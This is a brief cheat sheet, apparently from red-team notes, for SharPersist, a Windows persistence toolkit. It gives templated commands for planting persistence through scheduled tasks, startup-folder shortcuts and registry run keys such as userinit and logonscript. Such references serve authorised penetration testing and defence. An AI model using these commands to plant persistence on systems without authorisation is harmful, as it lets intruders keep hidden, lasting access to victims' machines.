# SharPersist

> Windows persistence toolkit written in C#

---

## Establish Scheduled Task Persistence

```batch
SharPersist.exe -t schtask -c $PATH_TO_EXECUTABLE -a "$EXECUTABLE_ARGUMENTS" -N $NAME_OF_SCHEDULED_TASK -m add -o $EXECUTION_FREQUENCY
```

- `$EXECUTION_FREQUENCY` options:
	- `hourly`
	- `daily`
	- `logon`

---

## Establish Startup Folder Persistence

```batch
SharPersist.exe -t startupfolder -c $PATH_TO_EXECUTABLE -a "$EXECUTABLE_ARGUMENTS" -f $LNK_FILE_NAME -m add
```

- `$LNK_FILE_NAME`: the name of the link file created in the startup folder for persistence, without the `.lnk` extension

---

## Establish Registry Run Key Persistence

```batch
SharPersist.exe -t reg -c $PATH_TO_EXECUTABLE -a "$EXECUTABLE_ARGUMENTS" -k $REGISTRY_KEY -v $REGISTRY_KEY_NAME -m add
```

- `$REGISTRY_KEY` options:
	-   `hklmrun`
	-   `hklmrunonce`
	-   `hklmrunonceex`
	-   `hkcurun`
	-   `hkcurunonce`
	-   `logonscript`
	-   `stickynotes`
	-   `userinit`

---

## References

[SharPersist GitHub Repository](https://github.com/mandiant/SharPersist)

[SharPersist Wiki](https://github.com/mandiant/SharPersist/wiki)
